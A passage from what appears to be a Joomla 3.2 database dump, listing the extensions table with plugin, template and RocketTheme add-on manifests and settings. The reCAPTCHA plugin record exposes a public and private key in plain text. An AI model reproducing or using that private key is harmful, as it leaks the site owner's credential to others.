reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_SEARCH_CATEGORIES_XML_DESCRIPTION\",\"group\":\"\"}','{\"search_limit\":\"50\",\"search_content\":\"1\",\"search_archived\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(418,'plg_search_contacts','plugin','contacts','search',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_search_contacts\",\"type\":\"plugin\",\"creationDate\":\"November 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_SEARCH_CONTACTS_XML_DESCRIPTION\",\"group\":\"\"}','{\"search_limit\":\"50\",\"search_content\":\"1\",\"search_archived\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(419,'plg_search_content','plugin','content','search',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_search_content\",\"type\":\"plugin\",\"creationDate\":\"November 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_SEARCH_CONTENT_XML_DESCRIPTION\",\"group\":\"\"}','{\"search_limit\":\"50\",\"search_content\":\"1\",\"search_archived\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(420,'plg_search_newsfeeds','plugin','newsfeeds','search',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_search_newsfeeds\",\"type\":\"plugin\",\"creationDate\":\"November 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_SEARCH_NEWSFEEDS_XML_DESCRIPTION\",\"group\":\"\"}','{\"search_limit\":\"50\",\"search_content\":\"1\",\"search_archived\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(421,'plg_search_weblinks','plugin','weblinks','search',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_search_weblinks\",\"type\":\"plugin\",\"creationDate\":\"November 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_SEARCH_WEBLINKS_XML_DESCRIPTION\",\"group\":\"\"}','{\"search_limit\":\"50\",\"search_content\":\"1\",\"search_archived\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(422,'plg_system_languagefilter','plugin','languagefilter','system',0,0,1,1,'{\"legacy\":false,\"name\":\"plg_system_languagefilter\",\"type\":\"plugin\",\"creationDate\":\"July 2010\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_SYSTEM_LANGUAGEFILTER_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',1,0),(423,'plg_system_p3p','plugin','p3p','system',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_system_p3p\",\"type\":\"plugin\",\"creationDate\":\"September 2010\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_P3P_XML_DESCRIPTION\",\"group\":\"\"}','{\"headers\":\"NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM\"}','','',0,'0000-00-00 00:00:00',2,0),(424,'plg_system_cache','plugin','cache','system',0,0,1,1,'{\"legacy\":false,\"name\":\"plg_system_cache\",\"type\":\"plugin\",\"creationDate\":\"February 2007\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_CACHE_XML_DESCRIPTION\",\"group\":\"\"}','{\"browsercache\":\"0\",\"cachetime\":\"15\"}','','',0,'0000-00-00 00:00:00',9,0),(425,'plg_system_debug','plugin','debug','system',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_system_debug\",\"type\":\"plugin\",\"creationDate\":\"December 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_DEBUG_XML_DESCRIPTION\",\"group\":\"\"}','{\"profile\":\"1\",\"queries\":\"1\",\"memory\":\"1\",\"language_files\":\"1\",\"language_strings\":\"1\",\"strip-first\":\"1\",\"strip-prefix\":\"\",\"strip-suffix\":\"\"}','','',0,'0000-00-00 00:00:00',4,0),(426,'plg_system_log','plugin','log','system',0,1,1,1,'{\"legacy\":false,\"name\":\"plg_system_log\",\"type\":\"plugin\",\"creationDate\":\"April 2007\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_LOG_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',5,0),(427,'plg_system_redirect','plugin','redirect','system',0,1,1,1,'{\"legacy\":false,\"name\":\"plg_system_redirect\",\"type\":\"plugin\",\"creationDate\":\"April 2009\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_REDIRECT_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',6,0),(428,'plg_system_remember','plugin','remember','system',0,1,1,1,'{\"legacy\":false,\"name\":\"plg_system_remember\",\"type\":\"plugin\",\"creationDate\":\"April 2007\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_REMEMBER_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',7,0),(429,'plg_system_sef','plugin','sef','system',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_system_sef\",\"type\":\"plugin\",\"creationDate\":\"December 2007\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_SEF_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',8,0),(430,'plg_system_logout','plugin','logout','system',0,1,1,1,'{\"legacy\":false,\"name\":\"plg_system_logout\",\"type\":\"plugin\",\"creationDate\":\"April 2009\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_SYSTEM_LOGOUT_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',3,0),(431,'plg_user_contactcreator','plugin','contactcreator','user',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_user_contactcreator\",\"type\":\"plugin\",\"creationDate\":\"August 2009\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_CONTACTCREATOR_XML_DESCRIPTION\",\"group\":\"\"}','{\"autowebpage\":\"\",\"category\":\"34\",\"autopublish\":\"0\"}','','',0,'0000-00-00 00:00:00',1,0),(432,'plg_user_joomla','plugin','joomla','user',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_user_joomla\",\"type\":\"plugin\",\"creationDate\":\"December 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2009 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_USER_JOOMLA_XML_DESCRIPTION\",\"group\":\"\"}','{\"autoregister\":\"1\"}','','',0,'0000-00-00 00:00:00',2,0),(433,'plg_user_profile','plugin','profile','user',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_user_profile\",\"type\":\"plugin\",\"creationDate\":\"January 2008\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_USER_PROFILE_XML_DESCRIPTION\",\"group\":\"\"}','{\"register-require_address1\":\"1\",\"register-require_address2\":\"1\",\"register-require_city\":\"1\",\"register-require_region\":\"1\",\"register-require_country\":\"1\",\"register-require_postal_code\":\"1\",\"register-require_phone\":\"1\",\"register-require_website\":\"1\",\"register-require_favoritebook\":\"1\",\"register-require_aboutme\":\"1\",\"register-require_tos\":\"1\",\"register-require_dob\":\"1\",\"profile-require_address1\":\"1\",\"profile-require_address2\":\"1\",\"profile-require_city\":\"1\",\"profile-require_region\":\"1\",\"profile-require_country\":\"1\",\"profile-require_postal_code\":\"1\",\"profile-require_phone\":\"1\",\"profile-require_website\":\"1\",\"profile-require_favoritebook\":\"1\",\"profile-require_aboutme\":\"1\",\"profile-require_tos\":\"1\",\"profile-require_dob\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(434,'plg_extension_joomla','plugin','joomla','extension',0,1,1,1,'{\"legacy\":false,\"name\":\"plg_extension_joomla\",\"type\":\"plugin\",\"creationDate\":\"May 2010\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_EXTENSION_JOOMLA_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',1,0),(435,'plg_content_joomla','plugin','joomla','content',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_content_joomla\",\"type\":\"plugin\",\"creationDate\":\"November 2010\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_CONTENT_JOOMLA_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(436,'plg_system_languagecode','plugin','languagecode','system',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_system_languagecode\",\"type\":\"plugin\",\"creationDate\":\"November 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_SYSTEM_LANGUAGECODE_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',10,0),(437,'plg_quickicon_joomlaupdate','plugin','joomlaupdate','quickicon',0,1,1,1,'{\"legacy\":false,\"name\":\"plg_quickicon_joomlaupdate\",\"type\":\"plugin\",\"creationDate\":\"August 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_QUICKICON_JOOMLAUPDATE_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(438,'plg_quickicon_extensionupdate','plugin','extensionupdate','quickicon',0,1,1,1,'{\"legacy\":false,\"name\":\"plg_quickicon_extensionupdate\",\"type\":\"plugin\",\"creationDate\":\"August 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_QUICKICON_EXTENSIONUPDATE_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(439,'plg_captcha_recaptcha','plugin','recaptcha','captcha',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_captcha_recaptcha\",\"type\":\"plugin\",\"creationDate\":\"December 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_CAPTCHA_RECAPTCHA_XML_DESCRIPTION\",\"group\":\"\"}','{\"public_key\":\"6Lc1O-ISAAAAAPOOPJWGPdJbcyn0fCQa0eDL5M9T\",\"private_key\":\"6Lc1O-ISAAAAAKgRSV87Xtvp2NemeT9EKNZz_xMH\",\"theme\":\"clean\"}','','',0,'0000-00-00 00:00:00',0,0),(440,'plg_system_highlight','plugin','highlight','system',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_system_highlight\",\"type\":\"plugin\",\"creationDate\":\"August 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_SYSTEM_HIGHLIGHT_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',7,0),(441,'plg_content_finder','plugin','finder','content',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_content_finder\",\"type\":\"plugin\",\"creationDate\":\"December 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_CONTENT_FINDER_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(442,'plg_finder_categories','plugin','categories','finder',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_finder_categories\",\"type\":\"plugin\",\"creationDate\":\"August 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_FINDER_CATEGORIES_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',1,0),(443,'plg_finder_contacts','plugin','contacts','finder',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_finder_contacts\",\"type\":\"plugin\",\"creationDate\":\"August 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_FINDER_CONTACTS_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',2,0),(444,'plg_finder_content','plugin','content','finder',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_finder_content\",\"type\":\"plugin\",\"creationDate\":\"August 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_FINDER_CONTENT_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',3,0),(445,'plg_finder_newsfeeds','plugin','newsfeeds','finder',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_finder_newsfeeds\",\"type\":\"plugin\",\"creationDate\":\"August 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_FINDER_NEWSFEEDS_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',4,0),(446,'plg_finder_weblinks','plugin','weblinks','finder',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_finder_weblinks\",\"type\":\"plugin\",\"creationDate\":\"August 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_FINDER_WEBLINKS_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',5,0),(447,'plg_finder_tags','plugin','tags','finder',0,1,1,0,'{\"name\":\"plg_finder_tags\",\"type\":\"plugin\",\"creationDate\":\"February 2013\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"3.0.0\",\"description\":\"PLG_FINDER_TAGS_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(448,'plg_twofactorauth_totp','plugin','totp','twofactorauth',0,0,1,0,'{\"name\":\"plg_twofactorauth_totp\",\"type\":\"plugin\",\"creationDate\":\"August 2013\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"3.2.0\",\"description\":\"PLG_TWOFACTORAUTH_TOTP_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(449,'plg_authentication_cookie','plugin','cookie','authentication',0,1,1,0,'{\"name\":\"plg_authentication_cookie\",\"type\":\"plugin\",\"creationDate\":\"July 2013\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"3.0.0\",\"description\":\"PLG_AUTH_COOKIE_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(450,'plg_twofactorauth_yubikey','plugin','yubikey','twofactorauth',0,0,1,0,'{\"name\":\"plg_twofactorauth_yubikey\",\"type\":\"plugin\",\"creationDate\":\"Se[ptember 2013\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"3.2.0\",\"description\":\"PLG_TWOFACTORAUTH_YUBIKEY_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(500,'atomic','template','atomic','',0,1,1,0,'{\"legacy\":false,\"name\":\"atomic\",\"type\":\"template\",\"creationDate\":\"10\\/10\\/09\",\"author\":\"Ron Severdia\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.\",\"authorEmail\":\"contact@kontentdesign.com\",\"authorUrl\":\"http:\\/\\/www.kontentdesign.com\",\"version\":\"2.5.0\",\"description\":\"TPL_ATOMIC_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(502,'bluestork','template','bluestork','',1,1,1,0,'{\"legacy\":false,\"name\":\"bluestork\",\"type\":\"template\",\"creationDate\":\"07\\/02\\/09\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"TPL_BLUESTORK_XML_DESCRIPTION\",\"group\":\"\"}','{\"useRoundedCorners\":\"1\",\"showSiteName\":\"0\",\"textBig\":\"0\",\"highContrast\":\"0\"}','','',0,'0000-00-00 00:00:00',0,0),(503,'beez_20','template','beez_20','',0,1,1,0,'{\"legacy\":false,\"name\":\"beez_20\",\"type\":\"template\",\"creationDate\":\"25 November 2009\",\"author\":\"Angie Radtke\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.\",\"authorEmail\":\"a.radtke@derauftritt.de\",\"authorUrl\":\"http:\\/\\/www.der-auftritt.de\",\"version\":\"2.5.0\",\"description\":\"TPL_BEEZ2_XML_DESCRIPTION\",\"group\":\"\"}','{\"wrapperSmall\":\"53\",\"wrapperLarge\":\"72\",\"sitetitle\":\"\",\"sitedescription\":\"\",\"navposition\":\"center\",\"templatecolor\":\"nature\"}','','',0,'0000-00-00 00:00:00',0,0),(504,'hathor','template','hathor','',1,1,1,0,'{\"legacy\":false,\"name\":\"hathor\",\"type\":\"template\",\"creationDate\":\"May 2010\",\"author\":\"Andrea Tarr\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.\",\"authorEmail\":\"hathor@tarrconsulting.com\",\"authorUrl\":\"http:\\/\\/www.tarrconsulting.com\",\"version\":\"2.5.0\",\"description\":\"TPL_HATHOR_XML_DESCRIPTION\",\"group\":\"\"}','{\"showSiteName\":\"0\",\"colourChoice\":\"0\",\"boldText\":\"0\"}','','',0,'0000-00-00 00:00:00',0,0),(505,'beez5','template','beez5','',0,1,1,0,'{\"legacy\":false,\"name\":\"beez5\",\"type\":\"template\",\"creationDate\":\"21 May 2010\",\"author\":\"Angie Radtke\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.\",\"authorEmail\":\"a.radtke@derauftritt.de\",\"authorUrl\":\"http:\\/\\/www.der-auftritt.de\",\"version\":\"2.5.0\",\"description\":\"TPL_BEEZ5_XML_DESCRIPTION\",\"group\":\"\"}','{\"wrapperSmall\":\"53\",\"wrapperLarge\":\"72\",\"sitetitle\":\"\",\"sitedescription\":\"\",\"navposition\":\"center\",\"html5\":\"0\"}','','',0,'0000-00-00 00:00:00',0,0),(600,'English (United Kingdom)','language','en-GB','',0,1,1,1,'{\"legacy\":false,\"name\":\"English (United Kingdom)\",\"type\":\"language\",\"creationDate\":\"2008-03-15\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.19\",\"description\":\"en-GB site language\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(601,'English (United Kingdom)','language','en-GB','',1,1,1,1,'{\"legacy\":false,\"name\":\"English (United Kingdom)\",\"type\":\"language\",\"creationDate\":\"2008-03-15\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.19\",\"description\":\"en-GB administrator language\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(700,'files_joomla','file','joomla','',0,1,1,1,'{\"legacy\":false,\"name\":\"files_joomla\",\"type\":\"file\",\"creationDate\":\"March 2014\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"3.2.3\",\"description\":\"FILES_JOOMLA_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(10002,'gantry','component','com_gantry','',0,1,0,0,'false','{}','','',0,'0000-00-00 00:00:00',0,0),(10003,'System - Gantry','plugin','gantry','system',0,1,1,0,'{\"legacy\":false,\"name\":\"System - Gantry\",\"type\":\"plugin\",\"creationDate\":\"April 12, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"4.1.24\",\"description\":\"Gantry System Plugin for Joomla\",\"group\":\"\"}','{\"debugloglevel\":\"63\"}','','',0,'0000-00-00 00:00:00',1,0),(10006,'RokNavMenu','module','mod_roknavmenu','',0,1,1,0,'{\"legacy\":false,\"name\":\"RokNavMenu\",\"type\":\"module\",\"creationDate\":\"November 5, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.0.7\",\"description\":\"RocketTheme Customizable Navigation Menu\",\"group\":\"\"}','{\"limit_levels\":\"0\",\"startLevel\":\"0\",\"endLevel\":\"0\",\"showAllChildren\":\"0\",\"filteringspacer2\":\"\",\"theme\":\"default\",\"custom_layout\":\"default.php\",\"custom_formatter\":\"default.php\",\"cache\":\"0\",\"module_cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"itemid\"}','','',0,'0000-00-00 00:00:00',0,0),(10009,'System - RokCommon','plugin','rokcommon','system',0,1,1,0,'{\"legacy\":false,\"name\":\"System - RokCommon\",\"type\":\"plugin\",\"creationDate\":\"March 11, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"3.1.11\",\"description\":\"RokCommon System Plugin\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10015,'RokAjaxSearch','module','mod_rokajaxsearch','',0,1,1,0,'{\"legacy\":false,\"name\":\"RokAjaxSearch\",\"type\":\"module\",\"creationDate\":\"February 17, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.0.2\",\"description\":\"RokAjaxSearch is an ajaxian searcher that displays the results immediately and allows to choose the\\n        proper one.\\n    \",\"group\":\"\"}','{\"search_page\":\"index.php?option=com_search&view=search&tmpl=component\",\"adv_search_page\":\"index.php?option=com_search&view=search\",\"include_css\":\"1\",\"theme\":\"blue\",\"searchphrase\":\"any\",\"ordering\":\"newest\",\"limit\":\"10\",\"perpage\":\"3\",\"websearch\":\"0\",\"blogsearch\":\"0\",\"imagesearch\":\"0\",\"videosearch\":\"0\",\"websearch_api\":\"\",\"show_pagination\":\"1\",\"safesearch\":\"MODERATE\",\"image_size\":\"MEDIUM\",\"show_estimated\":\"1\",\"hide_divs\":\"\",\"include_link\":\"1\",\"show_description\":\"1\",\"include_category\":\"1\",\"show_readmore\":\"1\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}','','',0,'0000-00-00 00:00:00',0,0),(10017,'Editor - RokPad','plugin','rokpad','editors',0,1,1,0,'{\"legacy\":false,\"name\":\"Editor - RokPad\",\"type\":\"plugin\",\"creationDate\":\"February 11, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.1.8\",\"description\":\"\\n        <div class=\\\"rokpad-description\\\">\\n        <img src=\\\"..\\/plugins\\/editors\\/rokpad\\/assets\\/admin\\/images\\/rokpad.jpg\\\" class=\\\"img-padding\\\" \\/><h1>RokPad<\\/h1>\\n        <h2>The Power of Desktop Text Editor in a Joomla!<\\/h2>\\n        <p>Ever wished you could use a powerful desktop text editor such as Textmate, SublimeText, or UltraEdit directly on a Joomla! web site?  Now with RokPad we provide many features and capabilities that traditionally would only be found in a powerful desktop editor.  RokPad provides advanced functions such as an Ajax saving action, syntax highlighting, configurable themes, multiple cursors and selections, shortcut keys, multiple language support, and many other incredible features.<\\/p>\\n\\n        <h2>Key Features:<\\/h2>\\n        <ul class=\\\"features\\\">\\n\\t\\t\\t<li>Code Highlighter built on the great ACE Editor<\\/li>\\n\\t        <li>Support for CSS, HTML, JavaScript, JSON, LESS, Markdown, PHP, SQL, Plain Text, Textile, XML and more...<\\/li>\\n\\t        <li>Ajax save and Automatic Save options. You\'ll never loose your content again, nor wait until the page has finished reloading after a save!<\\/li>\\n\\t        <li>Save, Undo, Redo, Goto line, Advanced Search and Search &amp; Replace, Full Screen. Settings like Themes, Font Size, Code Folding, Wrap Mode, Invisible Characters, Print Margin, Highlight of selected 